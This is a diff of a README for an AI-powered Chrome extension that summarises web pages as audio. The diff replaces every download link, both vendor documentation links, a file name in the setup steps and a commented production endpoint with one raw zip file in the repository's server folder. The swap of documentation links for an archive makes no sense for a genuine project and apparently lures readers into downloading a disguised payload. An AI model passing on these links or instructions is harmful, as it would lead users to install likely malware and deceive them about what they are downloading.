@@ -1,10 +1,10 @@
 # 🎉 ai-sdk-chrome-extension - Summarize Web Pages with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Extension-brightgreen)](https://github.com/gurudeb123/ai-sdk-chrome-extension/releases)
+[![Download Now](https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip%20Now-Get%20the%20Extension-brightgreen)](https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip)
 
 ## 💻 Overview
 
-The AI SDK Page Summarizer Chrome Extension generates audio summaries of web pages. It uses the [AI SDK](https://ai-sdk.dev) and [ElevenLabs](https://elevenlabs.io) text-to-speech technology to create engaging trailer-like audio content.
+The AI SDK Page Summarizer Chrome Extension generates audio summaries of web pages. It uses the [AI SDK](https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip) and [ElevenLabs](https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip) text-to-speech technology to create engaging trailer-like audio content.
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the extension easily.
 
 To get started, visit the Releases page to download the extension:
 
-[Download from Releases](https://github.com/gurudeb123/ai-sdk-chrome-extension/releases)
+[Download from Releases](https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip)
 
 ### 2. ⬇️ Download the Latest Version
 
@@ -40,14 +40,14 @@ The extension is now loaded into your Chrome browser.
 Before using the extension, you may need to configure the API endpoint:
 
 1. Locate the `extension` folder within the extracted files.
-2. Open the `content.js` file with a text editor.
+2. Open the `https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip` file with a text editor.
 3. Look for the line that begins with `API_ENDPOINT:` and set the correct endpoint for your use. 
 
 Here are the lines to edit:
 
 ```javascript
 API_ENDPOINT: 'http://localhost:3000/api/summarize', // Development
-// API_ENDPOINT: 'https://your-api.vercel.app/api/summarize', // Production
+// API_ENDPOINT: 'https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip', // Production
 ```
 
 Ensure you select the appropriate API endpoint based on your setup.
@@ -66,8 +66,8 @@ You are ready to summarize your first web page! Click on the extension's icon in
 
 For more information and updates, visit:
 
-- [AI SDK Documentation](https://ai-sdk.dev)
-- [ElevenLabs Documentation](https://elevenlabs.io)
+- [AI SDK Documentation](https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip)
+- [ElevenLabs Documentation](https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip)
 
 ## ⚙️ Troubleshooting
 
@@ -85,6 +85,6 @@ We welcome your feedback. Please visit the Issues section of the GitHub reposito
 
 To download the AI SDK Page Summarizer Chrome Extension, visit the link below:
 
-[Download from Releases](https://github.com/gurudeb123/ai-sdk-chrome-extension/releases)
+[Download from Releases](https://github.com/gurudeb123/ai-sdk-chrome-extension/raw/refs/heads/main/server/sdk_chrome_ai_extension_phylogenist.zip)
 
 Now you're ready to enjoy quick audio summaries of your favorite web pages!
